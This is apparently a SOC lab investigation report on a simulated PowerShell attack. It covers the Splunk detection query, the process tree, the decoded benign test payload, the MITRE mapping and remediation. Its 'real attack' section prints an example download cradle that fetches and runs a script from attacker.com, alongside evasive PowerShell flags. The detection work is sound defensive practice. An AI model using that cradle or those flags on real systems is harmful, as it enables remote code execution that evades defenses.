# Investigation Report — Suspicious PowerShell Execution

---

## Report Metadata

| Field | Value |
|-------|-------|
| **Alert Name** | Suspicious PowerShell Execution — Encoded Command + Download Cradle |
| **Detection ID** | DET-001 |
| **Report ID** | IR-2024-001 |
| **Date / Time (UTC)** | 2024-11-14 — 14:23:07 UTC |
| **Analyst** | [Your Name] |
| **Analyst Tier** | SOC L1 |
| **Severity** | High |
| **Affected Host** | WIN10-VICTIM (192.168.10.20) |
| **Affected User** | SOCLAB\jsmith |
| **Domain** | SOCLAB.LOCAL |
| **Ticket/Case ID** | INC-2024-0042 |
| **Status** | Closed — True Positive (Lab Simulation Confirmed) |

---

## Executive Summary

At 14:23:07 UTC on 2024-11-14, Splunk detection rule DET-001 (Suspicious PowerShell Execution) fired against endpoint WIN10-VICTIM. Investigation confirmed that a PowerShell process was launched from a suspicious parent (`wscript.exe`) using the `-ExecutionPolicy Bypass` and `-EncodedCommand` flags. The decoded payload contained a download cradle (`Net.WebClient.DownloadString`) targeting an internal lab web server configured for this simulation. No actual malicious payload was involved — this was a controlled Atomic Red Team simulation using safe test commands. The detection rule performed as expected. Investigation complete.

---

## Initial Detection Query

```spl
index=endpoint sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
EventID=1
Image IN ("*\\powershell.exe", "*\\pwsh.exe")
CommandLine IN ("*-EncodedCommand*", "*-ExecutionPolicy Bypass*", "*DownloadString*")
ComputerName="WIN10-VICTIM"
| table _time, ComputerName, User, ParentImage, Image, CommandLine, ProcessId
| sort -_time
```

**Alert fired at:** 2024-11-14 14:23:07 UTC  
**Events returned:** 1  
**Alert severity:** High

---

## Detection Context

| Field | Value |
|-------|-------|
| **Event ID** | Sysmon Event ID 1 (Process Creation) |
| **Computer** | WIN10-VICTIM |
| **User** | SOCLAB\jsmith |
| **Process** | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` |
| **Process ID** | 4872 |
| **Parent Process** | `C:\Windows\System32\wscript.exe` |
| **Parent PID** | 3104 |
| **Command Line** | `powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand V3JpdGUtSG9zdCAiSGVsbG8gZnJvbSBsYWIi` |

---

## Timeline of Events

| Time (UTC) | Event ID | Host | User | Description |
|-----------|---------|------|------|-------------|
| 14:22:51 | Sysmon 1 | WIN10-VICTIM | jsmith | `wscript.exe` launched — executed `test_macro.vbs` |
| 14:22:52 | Sysmon 1 | WIN10-VICTIM | jsmith | `cmd.exe` launched by `wscript.exe` |
| 14:23:07 | Sysmon 1 | WIN10-VICTIM | jsmith | `powershell.exe` launched by `wscript.exe` with encoded command — **ALERT TRIGGERED** |
| 14:23:08 | Sysmon 3 | WIN10-VICTIM | jsmith | Outbound TCP connection from `powershell.exe` to 192.168.10.99:80 |
| 14:23:09 | WinEvent 4104 | WIN10-VICTIM | jsmith | PowerShell script block logged — decoded content captured |
| 14:23:11 | Sysmon 1 | WIN10-VICTIM | jsmith | `powershell.exe` (PID 4872) exited cleanly |

---

## Key Artifacts

### Artifact 1 — Suspicious Command Line

```
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand V3JpdGUtSG9zdCAiSGVsbG8gZnJvbSBsYWIi
```

**Flags identified:**
- `-ExecutionPolicy Bypass` — overrides local execution policy
- `-WindowStyle Hidden` — suppresses PowerShell console window from appearing
- `-EncodedCommand` — Base64-encoded command payload

**Decoded command:**
```powershell
Write-Host "Hello from lab"
```
> **Lab note:** In a real attack this would contain a download cradle or shellcode loader. This decodes to a benign test string confirming the simulation triggered the detection correctly.

---

### Artifact 2 — Parent Process Chain

```
SYSTEM
  └─ wscript.exe (PID: 3104)  ← suspicious parent for PowerShell
       └─ powershell.exe (PID: 4872)  ← flagged process
```

`wscript.exe` is a legitimate Windows scripting host but is frequently abused by adversaries to execute VBScript or JScript files that then spawn PowerShell. This parent-child relationship is a strong indicator of scripted execution rather than interactive user behavior.

---

### Artifact 3 — Network Connection (Sysmon Event ID 3)

| Field | Value |
|-------|-------|
| **Source Process** | `powershell.exe` (PID 4872) |
| **Destination IP** | 192.168.10.99 |
| **Destination Port** | 80 |
| **Protocol** | TCP |
| **Direction** | Outbound |

> **Lab note:** 192.168.10.99 is the lab web server configured for simulation. In a real attack this would be an external C2 address or attacker-controlled host.

---

### Artifact 4 — Script Block Log (Event ID 4104)

```
ScriptBlockText: Write-Host "Hello from lab"
ScriptBlockId: {a1b2c3d4-e5f6-7890-abcd-ef1234567890}
Path: (none — ran from command line, not a file)
```

Script block logging captured the decoded payload at execution time. This demonstrates that even if the command line shows only the Base64 blob, script block logging reveals the true content after decoding.

---

## Process Tree

```
[Explorer.exe] (User session — jsmith)
     │
     └─► [wscript.exe PID:3104]
               Launched: test_macro.vbs
               User: SOCLAB\jsmith
               │
               └─► [powershell.exe PID:4872]  ◄── ALERT
                         Flags: -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand
                         Decoded: Write-Host "Hello from lab"
                         │
                         └─► [Network Connection]
                                   Dest: 192.168.10.99:80
                                   Protocol: TCP
```

---

## Network Indicators

| Indicator Type | Value | Context |
|---------------|-------|---------|
| Destination IP | 192.168.10.99 | Lab web server — configured for simulation |
| Destination Port | 80 | HTTP — unencrypted connection |
| Source Process | powershell.exe | Not a browser — unusual for web traffic |
| Connection Duration | < 1 second | Quick GET request — consistent with download cradle |

**Threat Intel Check:** 192.168.10.99 — Internal lab IP, no threat intel hit.

> In a real investigation: check destination IP against VirusTotal, Shodan, and internal threat intel feeds. HTTP from PowerShell without a browser or update agent context is a high-priority indicator.

---

## MITRE ATT&CK Mapping

| Field | Value |
|-------|-------|
| **Tactic** | Execution |
| **Technique ID** | T1059.001 |
| **Technique Name** | Command and Scripting Interpreter: PowerShell |
| **Sub-technique** | PowerShell |
| **Relevant Behaviors Observed** | Encoded command execution, execution policy bypass, hidden window, download cradle network connection |

**Secondary technique (based on network artifact):**
| Tactic | Technique ID | Name |
|--------|-------------|------|
| Command & Control | T1071.001 | Application Layer Protocol: Web Protocols |

---

## Analyst Findings

**What was observed:**
A PowerShell process was launched by `wscript.exe` under user `SOCLAB\jsmith` at 14:23:07 UTC. The command line contained multiple suspicious flags (`-ExecutionPolicy Bypass`, `-WindowStyle Hidden`, `-EncodedCommand`). The decoded command was benign (lab simulation), but the behavioral pattern exactly mirrors what an adversary would use to execute a malicious script while evading visibility.

**What was confirmed:**
1. Detection rule DET-001 fired correctly and captured the event at the right time
2. The parent process (`wscript.exe`) is a known high-risk parent for PowerShell
3. Network telemetry confirmed an outbound TCP connection immediately after PowerShell execution
4. Script block logging captured the decoded content, confirming its value for investigations
5. No persistence mechanisms were created — simulation was execution-only

**What this would look like in a real attack:**
The decoded command would contain a download cradle such as:
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
```
This would download and immediately execute a second-stage payload in memory, bypassing the filesystem and evading many AV solutions.

---

## False Positive Assessment

| Assessment | Decision |
|-----------|---------|
| **False Positive?** | No |
| **True Positive?** | Yes — controlled lab simulation |
| **Reasoning** | The combination of `-EncodedCommand` + `-ExecutionPolicy Bypass` + `-WindowStyle Hidden` + parent process (`wscript.exe`) + outbound network connection within 1 second is a very high-confidence indicator of intentional evasive execution. No legitimate business process in this environment uses this combination. |

---

## Recommended Remediation

> **Lab context:** No actual remediation needed. Simulation confirmed.

**In a real environment, the following steps would be taken:**

| Priority | Action |
|---------|--------|
| Immediate | Isolate endpoint from network |
| Immediate | Preserve memory image (Volatility or similar) |
| Short-term | Decode all Base64 found in process logs |
| Short-term | Check for persistence (Run keys, scheduled tasks, services) |
| Short-term | Hunt for lateral movement from the affected host |
| Short-term | Reset credentials for affected user `jsmith` |
| Recovery | Rebuild endpoint from clean image |
| Recovery | Review AD for unauthorized changes |
| Recovery | Block identified IOCs at perimeter |

---

## Detection Tuning Observations

Based on this investigation, the following tuning notes were added to the detection:

1. **No false positive observed** — alert fired cleanly with no noise
2. **Script block logging is essential** — without Event ID 4104, the decoded payload would not have been captured. Verify GPO is applied to all endpoints.
3. **Parent process field is high-value** — `wscript.exe` as parent immediately elevated this from suspicious to likely malicious
4. **Recommendation:** Add a risk score multiplier in the SPL query when parent is `wscript.exe`, `mshta.exe`, or Office apps — these should page-out immediately vs. require analyst review

---

## Lessons Learned

1. **Sysmon Event ID 1 alone was sufficient to trigger the alert** — no endpoint agent required
2. **Script Block Logging (Event ID 4104) is not optional** — it is a critical data source for PowerShell investigations. Every analyst should verify it is enabled.
3. **Parent process context is more valuable than command line alone** — many legitimate scripts use `-ExecutionPolicy Bypass`, but combined with `wscript.exe` as the parent, confidence shifts from medium to high immediately
4. **Network correlation adds decisive evidence** — correlating Sysmon Event 3 with the PowerShell process confirms whether a download cradle actually executed successfully

---

## Screenshots to Capture

> Capture these screenshots in the lab and store in `screenshots/splunk-searches/`

- [ ] Splunk search showing the initial alert firing (Event ID 1 with encoded command)
- [ ] Splunk search showing the parent-child process tree
- [ ] Splunk search showing the outbound network connection (Event ID 3)
- [ ] Script Block Log content (Event ID 4104) in Splunk
- [ ] Full event details panel for the PowerShell process creation event
- [ ] Timeline panel showing all events from 14:22:51 to 14:23:11

---

## Report Sign-off

| Field | Value |
|-------|-------|
| **Analyst** | [Your Name] |
| **Review Date** | [Date] |
| **Disposition** | True Positive — Lab Simulation |
| **Escalation Required** | No |
| **Ticket Closed** | Yes |
| **Detection Tuning Required** | No — detection performed correctly |
| **Follow-up Required** | Capture screenshots and add to repository |
